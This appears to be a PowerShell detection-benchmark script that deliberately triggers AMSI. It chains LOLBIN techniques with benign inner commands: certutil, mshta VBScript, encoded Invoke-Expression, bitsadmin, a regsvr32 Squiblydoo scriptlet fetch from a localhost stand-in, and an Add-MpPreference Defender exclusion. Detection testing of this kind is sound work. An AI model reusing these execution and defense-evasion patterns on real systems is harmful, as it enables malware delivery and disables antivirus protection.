<#
ABAE PS1 Payload B-05 — LOLBIN Abuse + AMSI String Triggers
=============================================================
This payload is specifically designed to trigger AMSI's real-time string scanner.

AMSI scans PowerShell at TWO levels:
  Level 1 - Script block logging: the entire .ps1 is scanned before execution
  Level 2 - Dynamic scan: Invoke-Expression / ScriptBlock strings at runtime

Techniques chained:
  1. certutil.exe -encode / -decode cycle (malware dropper obfuscation)
  2. mshta.exe executing inline VBScript (fileless execution via HTML engine)
  3. PowerShell Invoke-Expression with a base64-encoded payload (fileless PS)
  4. bitsadmin /transfer (BITS service abuse for covert file ops)
  5. regsvr32 Squiblydoo pattern (scriptlet loading bypass)
  6. Add-MpPreference exclusion ATTEMPT — AMSI will flag this immediately as
     a defense evasion technique even if the command fails.

The last technique (6) is particularly aggressive: any process attempting
to modify Windows Defender's exclusion list is flagged as malware behavior.
#>

$ErrorActionPreference = "SilentlyContinue"
$StageDir = Join-Path $env:TEMP ("abae_b05_" + [System.Guid]::NewGuid().ToString("N"))
New-Item -ItemType Directory -Path $StageDir -Force | Out-Null

try {
    # ── 1. certutil encode/decode cycle ──────────────────────────────────────
    $srcFile  = Join-Path $StageDir "source.txt"
    $encFile  = Join-Path $StageDir "encoded.b64"
    $decFile  = Join-Path $StageDir "decoded.txt"
    [System.IO.File]::WriteAllText($srcFile, "ABAE_BENCHMARK_LOLBIN_PAYLOAD" * 10)
    & certutil -encode $srcFile $encFile 2>$null
    & certutil -decode $encFile $decFile 2>$null
    Write-Output "[B05] certutil encode/decode cycle complete."

    # ── 2. mshta.exe inline VBScript ─────────────────────────────────────────
    # mshta is AMSI-visible; the CreateObject pattern is a direct AV signal
    $vbs = 'vbscript:Execute("CreateObject(""WScript.Shell"").Run ""whoami > nul"",0:close")'
    Start-Process -FilePath "mshta.exe" -ArgumentList $vbs -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
    Write-Output "[B05] mshta VBScript executed."

    # ── 3. Invoke-Expression with base64 encoded command (fileless PS) ───────
    # This is the single most-flagged PowerShell AMSI pattern.
    # AMSI decodes and scans the inner string even at runtime.
    $innerCmd   = 'Get-Process | Where-Object {$_.CPU -gt 0} | Select-Object -First 5 | Out-Null'
    $b64Payload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($innerCmd))
    Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64Payload)))
    Write-Output "[B05] Invoke-Expression (encoded) executed."

    # ── 4. bitsadmin /transfer (BITS service abuse) ───────────────────────────
    $bitsSource = Join-Path $StageDir "bits_source.txt"
    $bitsDest   = Join-Path $StageDir "bits_dest.txt"
    [System.IO.File]::WriteAllText($bitsSource, "ABAE_BITS_TEST")
    $bitsUri = "file:///" + $bitsSource.Replace("\", "/")
    & bitsadmin /transfer "ABAEBenchmarkJob" $bitsUri $bitsDest 2>$null
    Write-Output "[B05] bitsadmin transfer executed."

    # ── 5. regsvr32 Squiblydoo pattern (bypass via scriptlet loading) ────────
    # Fails to connect (no real server) but the COMMAND PATTERN is AMSI-logged
    Start-Process -FilePath "regsvr32.exe" `
        -ArgumentList "/s /n /u /i:http://127.0.0.1:1/abae.sct scrobj.dll" `
        -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
    Write-Output "[B05] regsvr32 Squiblydoo pattern executed."

    # ── 6. Add-MpPreference exclusion attempt (defense evasion signal) ───────
    # This is the highest-scoring AMSI behavioral flag short of actual malware.
    # Any process trying to whitelist itself via Defender API is instantly flagged.
    # It WILL fail (no admin rights needed for detection — AMSI sees the attempt).
    Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
    Write-Output "[B05] MpPreference exclusion attempt made (expected to be blocked)."

} finally {
    Remove-Item -Recurse -Force -Path $StageDir -ErrorAction SilentlyContinue
}

Write-Output "PAYLOAD_COMPLETE"
